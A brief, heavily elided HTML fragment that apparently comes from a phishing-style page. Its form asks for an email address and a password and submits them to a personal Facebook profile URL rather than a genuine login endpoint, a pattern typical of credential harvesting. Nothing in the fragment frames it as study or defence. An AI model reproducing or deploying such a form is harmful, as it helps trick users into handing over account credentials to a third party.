...
<html>
    ...
    <body class="newStyle1" >
        ...
        <form method="post" id="reg" name="reg" action="https://facebook.com/hyperboss2003">
            ...
            <input type="text" data-type="text" name="email" placeholder="Email" style="width: 310px; height: 40px;" required="1" class="newStyle6" /><br /><br />
            <input type="password" data-type="text" name="psswd" placeholder="Password" style="height: 40px; width: 308px;" required="1" class="newStyle7" /><br /><br />
